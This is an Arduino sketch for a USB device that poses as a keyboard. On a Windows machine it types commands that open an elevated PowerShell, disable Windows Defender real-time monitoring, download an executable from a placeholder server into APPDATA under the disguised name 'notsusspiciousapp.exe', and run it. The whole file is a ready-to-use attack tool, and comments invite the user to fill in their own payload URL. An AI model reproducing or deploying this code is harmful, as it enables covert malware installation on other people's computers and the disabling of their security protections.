#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  Keyboard.begin();

  delay(500);

  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));

  typeKey(KEY_RETURN);

  delay(10000);
  Keyboard.print(F("Set-MpPreference -DisableRealtimeMonitoring $true"));

  typeKey(KEY_RETURN);

  // Edit this
  Keyboard.print(F("$url = 'https://your.server/payload.exe';"));

  typeKey(KEY_RETURN);

  // and this
  Keyboard.print(F("$file = $env:APPDATA + '\\notsusspiciousapp.exe';"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$down = New-Object System.Net.WebClient; $down.DownloadFile($url,$file);"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("$file"));

  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {}